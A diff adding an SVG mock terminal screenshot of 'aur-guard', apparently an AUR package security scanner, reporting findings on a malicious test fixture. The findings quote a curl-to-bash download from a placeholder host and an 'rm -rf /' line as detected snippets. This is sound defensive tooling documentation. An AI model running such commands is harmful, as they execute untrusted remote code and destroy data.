@@ -1,0 +1,68 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="1120" height="700" viewBox="0 0 1120 700" role="img" aria-labelledby="title desc">
+  <title id="title">aur-guard scan screenshot</title>
+  <desc id="desc">Terminal-style screenshot showing aur-guard auditing an AUR package fixture and reporting deterministic FAIL findings with file and line references.</desc>
+  <defs>
+    <style>
+      .bg { fill: #eef1ec; }
+      .term { fill: #101715; rx: 8; }
+      .bar { fill: #1f2a27; }
+      .dotRed { fill: #e15a4f; }
+      .dotYellow { fill: #e3b341; }
+      .dotGreen { fill: #55bd75; }
+      .title { fill: #dfe8e2; font: 700 13px system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; }
+      .mono { font: 500 16px ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; }
+      .prompt { fill: #72d39d; }
+      .cmd { fill: #f3f7f4; }
+      .dim { fill: #8da098; }
+      .text { fill: #d8e2dc; }
+      .pass { fill: #78d99d; }
+      .warn { fill: #f0bd64; }
+      .fail { fill: #ff8177; font-weight: 800; }
+      .crit { fill: #ff8177; font-weight: 800; }
+      .high { fill: #ffb46b; font-weight: 800; }
+      .med { fill: #f6d26f; font-weight: 800; }
+      .rule { fill: #9ad7ff; }
+      .snippet { fill: #c8d3ce; }
+      .captionTitle { fill: #17201c; font: 800 32px system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; }
+      .caption { fill: #45544e; font: 500 16px system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; }
+    </style>
+  </defs>
+
+  <rect class="bg" width="1120" height="700"/>
+  <text class="captionTitle" x="70" y="68">Deterministic AUR scan</text>
+  <text class="caption" x="70" y="98">A compact terminal report: exact file lines, severity, and manual review guidance.</text>
+
+  <rect class="term" x="70" y="130" width="980" height="510"/>
+  <rect class="bar" x="70" y="130" width="980" height="44" rx="8"/>
+  <circle class="dotRed" cx="98" cy="152" r="7"/>
+  <circle class="dotYellow" cx="122" cy="152" r="7"/>
+  <circle class="dotGreen" cx="146" cy="152" r="7"/>
+  <text class="title" x="560" y="157" text-anchor="middle">aur-guard audit --pkgdir tests/fixtures/malicious-pipe</text>
+
+  <clipPath id="terminalClip">
+    <rect x="70" y="174" width="980" height="466"/>
+  </clipPath>
+
+  <g clip-path="url(#terminalClip)">
+    <g class="mono" transform="translate(100 204)" xml:space="preserve">
+      <text y="0"><tspan class="prompt">$</tspan><tspan class="cmd"> aur-guard audit --pkgdir tests/fixtures/malicious-pipe</tspan></text>
+      <text class="text" y="42">aur-guard audit report</text>
+      <text y="76"><tspan class="dim">target:</tspan><tspan class="text"> aur-guard-malicious-pipe</tspan></text>
+      <text y="110"><tspan class="dim">status:</tspan><tspan class="fail"> FAIL</tspan><tspan class="dim">    risk_score:</tspan><tspan class="fail"> 100/100</tspan></text>
+
+      <text class="text" y="158">Findings:</text>
+      <text y="196"><tspan class="crit">[CRITICAL]</tspan><tspan class="text"> PKGBUILD:11 Remote download piped to interpreter</tspan></text>
+      <text y="226"><tspan class="dim">  rule:</tspan><tspan class="rule"> shell.remote-pipe</tspan></text>
+      <text y="256"><tspan class="dim">  review:</tspan><tspan class="text"> review fetched script before any build or install step</tspan></text>
+      <text y="286"><tspan class="dim">  snippet:</tspan><tspan class="snippet"> curl -fsSL https://example.invalid/payload.sh | bash</tspan></text>
+
+      <text y="332"><tspan class="crit">[CRITICAL]</tspan><tspan class="text"> local.sh:2 Known dangerous command</tspan></text>
+      <text y="362"><tspan class="dim">  rule:</tspan><tspan class="rule"> dangerous.command</tspan><tspan class="snippet">    rm -rf /</tspan></text>
+
+      <text y="396"><tspan class="high">[HIGH]</tspan><tspan class="text"> PKGBUILD:17 Writes outside pkgdir/srcdir</tspan></text>
+      <text y="424"><tspan class="med">[MEDIUM]</tspan><tspan class="text"> PKGBUILD:8 Checksum verification skipped</tspan></text>
+    </g>
+  </g>
+
+  <text class="caption" x="70" y="674">Language avoids declaring packages safe: PASS means no high-risk deterministic findings were detected.</text>
+</svg>
